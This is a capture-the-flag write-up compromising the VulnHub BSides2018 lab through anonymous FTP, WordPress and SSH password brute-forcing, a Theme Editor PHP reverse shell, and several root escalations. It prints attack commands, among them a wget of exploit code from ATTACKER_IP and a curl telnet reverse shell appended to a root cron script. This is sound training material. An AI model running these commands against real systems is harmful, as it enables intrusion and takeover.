# VulnHub - BSides2018 Writeup - Jai Shri Ram This is 1 way

> **Platform:** VulnHub
> **Machine:** BSides2018
> **Category:** Linux | WordPress | FTP | SSH | Password Attacks | Privilege Escalation

---

# Overview

Today we are back again with another machine from **VulnHub** which is designed for **OSCP+ style preparation**. Unlike beginner Boot2Root machines, this box combines multiple attack surfaces and requires chaining together information gathered from different services before finally obtaining root access.

The machine exposes FTP, SSH and a WordPress application. Through anonymous FTP access we obtain a list of usernames, while the web server reveals an outdated backup WordPress installation. After enumerating the application and identifying valid credentials through password attacks, we gain administrative access to WordPress, upload a PHP reverse shell through the Theme Editor, and obtain an initial shell on the system. Further enumeration reveals another user's SSH credentials, which ultimately lead to a fully privileged account capable of executing commands as root through sudo.

This machine demonstrates how weak credentials, exposed backup applications and poor privilege management can combine into a complete system compromise.

---

# Target Information

| Information      | Value              |
| ---------------- | ------------------ |
| Machine Name     | BSides2018         |
| Platform         | VulnHub            |
| Difficulty       | Intermediate       |
| Operating System | Ubuntu             |
| Target IP        | **192.168.56.139** |

---

# Host Discovery

Unlike many VulnHub machines, the target IP is not provided.

The first step is discovering the machine on the local network.

Using Netdiscover:

```bash
netdiscover -i eth1
```

The scan identifies the following host.

```text
192.168.56.139
```

This becomes our target.

---

# Initial Reconnaissance

A full TCP port scan is performed.

```bash
nmap -p- 192.168.56.139
```

The scan reveals three open ports.

```text
21/tcp   FTP

22/tcp   SSH

80/tcp   HTTP
```

With FTP allowing anonymous access and HTTP exposed, these become the primary attack surface.

---

# Service Enumeration

A service and version detection scan provides additional information.

```bash
nmap -sC -sV 192.168.56.139
```

Important findings include:

| Port | Service | Version |
| ---- | ------- | ------- |
| 21   | vsFTPd  | 2.3.5   |
| 22   | OpenSSH | 5.9p1   |
| 80   | Apache  | 2.2.22  |

Several interesting observations immediately stand out.

### FTP

Anonymous login is enabled.

```text
Anonymous FTP login allowed
```

### HTTP

The robots.txt file contains:

```text
/backup_wordpress
```

This strongly suggests an exposed backup copy of a WordPress installation.

---

# Enumerating FTP

Since anonymous authentication is permitted, the FTP service is explored first.

```bash
ftp 192.168.56.139
```

Logging in anonymously succeeds.

Listing the contents reveals:

```text
public/
```

Inside the directory a backup file is discovered.

```text
users.txt.bk
```

Downloading the file:

```bash
get users.txt.bk
```

reveals:

```text
abatchy

john

mai

anne

doomguy
```

Although these are not passwords, they immediately become valuable for future password attacks.

---

# Web Enumeration

Browsing to the main website reveals almost no useful information.

The next logical step is checking robots.txt.

The hidden directory discovered earlier is visited.

```text
/backup_wordpress
```

This directory hosts a complete WordPress installation.

Because it appears to be a backup copy, it is likely outdated and poorly maintained.

---

# WordPress Enumeration

WPScan is used to enumerate the installation.

```bash
wpscan --url http://192.168.56.139/backup_wordpress/
```

The scan reveals several important findings.

* WordPress 4.5
* PHP 5.3
* XML-RPC Enabled
* WP-Cron Enabled
* TwentySixteen Theme
* Apache 2.2.22

The version is significantly outdated.

While researching available exploits, another interesting discovery appears directly on the website.

A blog post contains the following message.

```text
New blog is being set up.

All current posts will be migrated.

For any questions, please contact IT administrator John.
```

This confirms that **John** is an administrative user.

---

# Identifying Valid Credentials

Using the usernames recovered from FTP, password attacks are performed one account at a time.

Rather than attempting every username simultaneously, each account is tested individually.

```bash
wpscan \
--url http://192.168.56.139/backup_wordpress \
-U users.txt.bk \
-P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

Eventually WPScan reports:

```text
john : enigma
```

Valid WordPress credentials have now been identified.

---

# Administrative Access

Logging into:

```text
/backup_wordpress/wp-admin
```

using:

```text
Username: john

Password: enigma
```

successfully provides administrative access.

At this point the objective becomes obtaining remote code execution.

---

# Achieving Remote Code Execution

Since administrator privileges are available, the built-in Theme Editor can be abused.

The following page is opened.

```text
Appearance

↓

Theme Editor

↓

404.php
```

A PHP reverse shell generated from **revshells.com** replaces the contents of the template.

A Netcat listener is started.

```bash
rlwrap nc -lvnp 4444
```

After triggering the modified 404 page, a reverse shell connects back.

```text
uid=33(www-data)

Linux bsides2018
```

Initial access has been obtained.

---

# Shell Stabilization

Using rlwrap provides a far more usable interactive shell.

Unlike a standard Netcat session, command history and terminal editing become available, making post-exploitation significantly easier.

The shell executes as:

```text
www-data
```

---

# Further Enumeration

While the reverse shell provides limited privileges, another attack path is investigated simultaneously.

Earlier we discovered several usernames through anonymous FTP.

The WordPress credentials only work for the web application.

Testing the same credentials against SSH fails.

Instead, Hydra is used to identify additional weak passwords.

```bash
hydra \
-l anne \
-P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt \
ssh://192.168.56.139
```

Eventually Hydra successfully identifies:

```text
anne : princess
```

This provides interactive SSH access.

---

# SSH Access

Connecting through SSH:

```bash
ssh anne@192.168.56.139
```

using:

```text
Password:

princess
```

successfully logs into the machine.

Unlike the web shell, SSH provides a much more stable environment for privilege escalation.

---

# Privilege Escalation

The first privilege escalation check performed is:

```bash
sudo -l
```

Surprisingly, the result is:

```text
(ALL : ALL) ALL
```

This means the user **anne** is permitted to execute any command as root.

No exploit is required.

Simply executing:

```bash
sudo su
```

immediately provides a root shell.

The privilege escalation is complete.

---

# Root Flag

Navigating into the root directory reveals:

```text
flag.txt
```

Reading the file displays:

```text
Congratulations!

If you can read this, that means you were able to obtain root permissions on this VM.

You should be proud!

There are multiple ways to gain access remotely, as well as for privilege escalation.

Did you find them all?

@abatchy17
```

The machine has now been successfully compromised.

---

# Alternative Privilege Escalation Paths

One of the most interesting aspects of this machine is that it offers **multiple privilege escalation paths**. Rather than relying on a single intended solution, several different techniques can be used to obtain root access depending on how deeply the machine is enumerated.

Below are the alternative privilege escalation paths that were discovered during the assessment.

---

# Privilege Escalation Path 1 – Enumerating Other User Credentials

After obtaining an initial shell through the vulnerable WordPress installation, another possibility was to identify additional user credentials.

Using the usernames recovered from the anonymous FTP share, password attacks were attempted against SSH.

The first user tested was **john**.

```bash id="pv6wtw"
hydra -l john \
-P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt \
ssh://192.168.56.139
```

However, Hydra immediately returned:

```text id="76jmg5"
Target does not support password authentication.
```

The same behaviour was observed for:

* john
* mai
* abatchy
* doomguy

Each account rejected password authentication entirely.

Only the **anne** account accepted password-based SSH authentication and eventually revealed valid credentials.

This demonstrates why it is always worth testing every discovered account individually rather than assuming all users share identical SSH configurations.

---

# Testing FTP Credentials

Since SSH authentication failed for most users, FTP authentication was investigated as well.

The same usernames were tested using password attacks.

Unfortunately, none of the discovered accounts produced valid FTP credentials.

At this point no additional attack surface was gained through FTP.

This left the previously obtained web shell as the primary avenue for further privilege escalation.

---

# Preparing the Web Shell

The initial PHP reverse shell was functional but lacked a proper interactive terminal.

The shell was upgraded using Python.

```bash id="y7pdrt"
python -c 'import pty; pty.spawn("/bin/bash")'
```

After suspending the session:

```text id="yzvygq"
CTRL + Z
```

the attacker's terminal was configured.

```bash id="qilz6e"
stty raw -echo

fg

export TERM=xterm
```

This produced a much more stable interactive shell for local enumeration.

---

# Running LinPEAS

With a stable shell established, LinPEAS was transferred to the target.

Running LinPEAS revealed several interesting findings.

One notable discovery was the presence of local-only services.

```text id="bllrj0"
127.0.0.1:3306

MySQL
```

This confirmed that the machine hosted a locally accessible MySQL server.

Although not directly exploitable, it represented another potential enumeration target.

LinPEAS also highlighted something significantly more interesting.

The running kernel appeared vulnerable to the well-known **Dirty COW** local privilege escalation vulnerability.

---

# Privilege Escalation Path 2 – Dirty COW (Compiled Exploit)

Because the kernel version matched publicly available Dirty COW exploits, the first attempt involved compiling an existing proof-of-concept.

The exploit source was downloaded.

```bash id="ljb4xw"
wget http://ATTACKER_IP:8000/40839.c
```

Compilation succeeded.

```bash id="jlwm5e"
gcc -pthread 40839.c -o dirty -lcrypt
```

Executing the exploit prompted for a new password.

```text id="vuk2qq"
Please enter the new password
```

Unfortunately, shortly after execution the target machine unexpectedly rebooted.

The exploit was therefore considered unstable on this particular system.

Rather than continuing with an unreliable kernel exploit, another Dirty COW implementation was investigated.

---

# Privilege Escalation Path 3 – DirtyCow Python Launcher

Instead of compiling the traditional exploit, a Python-based launcher was uploaded.

Executing:

```bash id="tfqfw8"
python dirtycow.py
```

presented two available options.

```text id="2bhudw"
[0]

run_dirty_cow

[1]

run_replace_dirty_cow
```

Selecting:

```text id="odtohm"
0
```

triggered the privilege escalation.

The launcher successfully replaced the system passwd binary.

```text id="evz2j9"
Backing up /usr/bin/passwd

/usr/bin/passwd overwritten

Popping root shell
```

Within seconds the exploit returned:

```text id="7yq9qn"
root@bsides2018
```

This method proved significantly more reliable than the compiled proof-of-concept and resulted in immediate root access.

---

# Investigating MySQL

Although root access had already been achieved through Dirty COW, additional enumeration continued to identify other possible attack paths.

Inspecting the WordPress configuration file revealed database credentials.

```php id="g6wm2v"
define('DB_NAME', 'wp');

define('DB_USER', 'john@localhost');

define('DB_PASSWORD', 'thiscannotbeit');
```

Using these credentials:

```bash id="im08d2"
mysql -u john@localhost -p
```

authentication succeeded.

While database access was obtained, no immediately useful privilege escalation vector was identified inside MySQL.

The database did not provide direct operating system command execution.

This path ultimately proved to be a dead end.

---

# Privilege Escalation Path 4 – Cron Job Abuse

Returning to LinPEAS output uncovered another interesting finding.

Inspecting the system crontab revealed:

```text id="hysyn5"
* * * * *

root

/usr/local/bin/cleanup
```

A root-owned script was executing every minute.

This immediately became the next focus of investigation.

Viewing the script showed:

```bash id="06m6pi"
#!/bin/sh

rm -rf /var/log/apache2/*
```

At first glance it simply removed Apache log files.

However, if the script proved writable, it could potentially be abused.

Appending a reverse shell payload to the cleanup script:

```bash id="4fdlrg"
echo "C='curl -Ns telnet://ATTACKER_IP:4445'; \
\$C </dev/null 2>&1 | /bin/bash 2>&1 | \$C >/dev/null" \
>> /usr/local/bin/cleanup
```

caused the next cron execution to run attacker-controlled commands as **root**.

Once the scheduled task executed, a reverse shell connected back.

Verifying privileges confirmed:

```text id="zv83lh"
uid=0(root)
```

The machine was successfully compromised through an entirely different privilege escalation technique.

---

# Comparing the Privilege Escalation Methods

| Method                         | Result                        |
| ------------------------------ | ----------------------------- |
| Anne + sudo                    | Immediate root shell          |
| Dirty COW (Compiled)           | Unstable, caused reboot       |
| DirtyCow Python Launcher       | Successful root shell         |
| WordPress Database Credentials | Enumeration only              |
| Writable Cron Job              | Successful root reverse shell |

---

# Lessons Learned

This machine is an excellent example of why local enumeration should never stop after discovering a single privilege escalation path.

Although the **Anne** account already provided unrestricted sudo access, additional investigation uncovered several completely independent methods of becoming root.

The machine demonstrates multiple real-world privilege escalation techniques, including:

* Weak sudo configurations.
* Linux kernel vulnerabilities (Dirty COW).
* Writable cron jobs.
* Database credential discovery.
* Local service enumeration.

Each path reinforces the importance of thorough post-exploitation enumeration. In real penetration tests and OSCP-style examinations, identifying multiple routes to the same objective strengthens both technical understanding and reporting quality by demonstrating the full attack surface rather than only the quickest solution.


# Attack Flow

```text
Host Discovery
        │
        ▼
Nmap Enumeration
        │
        ▼
Anonymous FTP Login
        │
        ▼
Download users.txt.bk
        │
        ▼
Enumerate WordPress Backup
        │
        ▼
Run WPScan
        │
        ▼
Identify Username John
        │
        ▼
Bruteforce WordPress Credentials
        │
        ▼
Admin Dashboard Access
        │
        ▼
Modify 404.php
        │
        ▼
PHP Reverse Shell
        │
        ▼
Obtain www-data Shell
        │
        ▼
Bruteforce SSH Credentials
        │
        ▼
SSH Login as Anne
        │
        ▼
Check sudo Privileges
        │
        ▼
sudo su
        │
        ▼
Root Shell
        │
        ▼
Read flag.txt
```

---

# Vulnerabilities Identified

* Anonymous FTP access enabled.
* Sensitive username list exposed through FTP.
* Backup WordPress installation publicly accessible.
* Outdated WordPress installation.
* Weak WordPress credentials.
* Weak SSH credentials.
* WordPress Theme Editor permitting arbitrary PHP execution.
* Overly permissive sudo configuration allowing full administrative access.

---

# Techniques Used

* Host Discovery
* Nmap Enumeration
* Anonymous FTP Enumeration
* Information Disclosure
* WordPress Enumeration
* WPScan
* Password Brute Forcing
* WordPress Administration Abuse
* PHP Reverse Shell
* Hydra SSH Password Attack
* Linux Enumeration
* Sudo Privilege Escalation

---

# Key Takeaways

This machine demonstrates how multiple seemingly minor security weaknesses can combine into a complete compromise. Anonymous FTP access exposed a list of usernames that significantly reduced the effort required for password attacks. An outdated backup WordPress installation provided an additional attack surface, while weak credentials allowed administrative access without exploiting a software vulnerability. From there, the built-in Theme Editor enabled arbitrary PHP execution and an initial shell.

The privilege escalation phase reinforces another common real-world issue: overly permissive sudo configurations. Even though the initial shell had limited privileges, obtaining credentials for another user revealed unrestricted sudo access, making privilege escalation trivial. The machine highlights the importance of removing unnecessary backup applications, disabling anonymous FTP, enforcing strong passwords, restricting administrative features, and carefully auditing sudo permissions to prevent full system compromise.
